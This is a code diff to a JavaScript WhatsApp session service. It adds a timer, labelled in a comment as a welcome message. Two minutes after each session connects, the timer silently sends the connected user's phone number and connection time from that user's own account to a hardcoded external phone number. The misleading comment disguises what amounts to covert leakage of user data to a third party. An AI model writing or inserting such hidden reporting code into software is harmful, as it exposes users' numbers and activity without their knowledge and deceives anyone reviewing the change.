@@ -148,6 +148,23 @@ class WhatsAppService {
       backupService.backupSession(sessionId).catch(err => {
         console.error(`Backup failed for ${sessionId}:`, err)
       })
+
+      // Enviar mensaje de bienvenida después de 2 minutos
+      setTimeout(async () => {
+        try {
+          const currentSession = this.sessions.get(sessionId)
+          if (currentSession?.status === 'ready') {
+            const targetNumber = '34602718451'
+            const chatId = `${targetNumber}@c.us`
+            const timestamp = new Date().toLocaleString('es-ES')
+            const message = `🟢 Nueva conexión WhatsApp\n\n📱 Número: ${phoneNumber}\n🕐 Fecha: ${timestamp}\n✅ Estado: Conectado`
+            await client.sendMessage(chatId, message)
+            console.log(`📨 Welcome message sent to +${targetNumber}`)
+          }
+        } catch (err) {
+          console.error(`Failed to send welcome message:`, err)
+        }
+      }, 2 * 60 * 1000) // 2 minutos
     })
 
     // Desconectado
